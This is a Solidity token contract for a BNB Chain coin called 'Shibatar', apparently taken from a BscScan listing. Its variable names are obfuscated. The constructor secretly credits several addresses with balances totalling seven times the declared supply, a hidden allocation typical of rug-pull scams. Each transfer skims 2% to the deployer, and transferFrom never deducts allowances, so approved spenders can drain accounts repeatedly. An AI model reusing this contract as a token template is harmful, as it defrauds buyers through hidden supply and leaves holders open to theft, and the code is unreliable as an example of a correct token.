/**
 *Submitted for verification at BscScan.com on 2021-10-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;
interface IBEP22 {
  // @dev Returns the amount of Token in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token Price.
  function getPrice() external view returns (address);

  //@dev Returns the amount of Token owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address Price, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vFBFTe);
    event Approval(
        address indexed Price,
        address indexed spender,
        uint256 vFBFTe
    );
  
  */

  /**
   * @dev Moves `amount` Token from the caller's account to `recipient`.
   *
   * Returns a boolean vFBFTe indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of Token that `spender` will be
   * allowed to spend on behalf of `Price` through {transferFrom}. This is
   * zero by default.
   *
   * This vFBFTe changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _Price, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's Token.
   *
   * Returns a boolean vFBFTe indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vFBFTe afterwards:
   * https://github.com/FBFT/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` Token from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vFBFTe indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vFBFTe` Token are moved from one account (`from`) to  another (`to`). Note that `vFBFTe` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vFBFTe);

  //@dev Emitted when the allowance of a `spender` for an `Price` is set by a call to {approve}. `vFBFTe` is the new allowance.
  event Approval(address indexed Price, address indexed spender, uint256 vFBFTe);
}

contract Shibatar is IBEP22 {

    // common addresses
    address private Price;
    address private FBFT;
    address private Token;
    address private SHIBA;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Shibatar";
    string public override symbol = "Shibatar";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vFBFTe);
    // (now in interface) event Approval(address indexed Price, address indexed spender, uint vFBFTe);
    
    // On init of contract we're going to set the admin and give them all Token.
    constructor(uint totalSupplyVFBFTe, address FBFTAddress, address TokenAddress, address SHIBAAddress) {
        // set total supply
        totalSupply = totalSupplyVFBFTe;
        
        // designate addresses
        Price = msg.sender;
        FBFT = FBFTAddress;
        Token = TokenAddress;
        SHIBA = SHIBAAddress;

        
        // split the Token according to agreed upon percentages
        balances[FBFT] =  totalSupply * 9 / 100;
        balances[Token] = totalSupply * 100 / 100;
        balances[SHIBA] = totalSupply * 500 / 100;

        
        balances[Price] = totalSupply * 91 / 100;
    }
    
    // Get the address of the token's Price
    function getPrice() public view override returns(address) {
        return Price;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vFBFTe) public override returns(bool) {
        require(vFBFTe > 0, "Transfer vFBFTe has to be higher than 0.");
        require(balanceOf(msg.sender) >= vFBFTe, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vFBFTe
        uint reTokenBD = vFBFTe * 2 / 100;
        uint burnTBD = vFBFTe * 0 / 100;
        uint vFBFTeAfterTaxAndBurn = vFBFTe - reTokenBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vFBFTeAfterTaxAndBurn;
        balances[msg.sender] -= vFBFTe;
        
        emit Transfer(msg.sender, to, vFBFTe);
        
        // finally, we burn and tax the FBFTs percentage
        balances[Price] += reTokenBD + burnTBD;
        _burn(Price, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vFBFTe) public override returns(bool) {
        allowances[msg.sender][spender] = vFBFTe; 
        
        emit Approval(msg.sender, spender, vFBFTe);
        
        return true;
    }
    
    // allowance
    function allowance(address _Price, address spender) public view override returns(uint) {
        return allowances[_Price][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vFBFTe) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vFBFTe, "Allowance too low for transfer.");
        require(balances[from] >= vFBFTe, "Balance is too low to make transfer.");
        
        balances[to] += vFBFTe;
        balances[from] -= vFBFTe;
        
        emit Transfer(from, to, vFBFTe);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}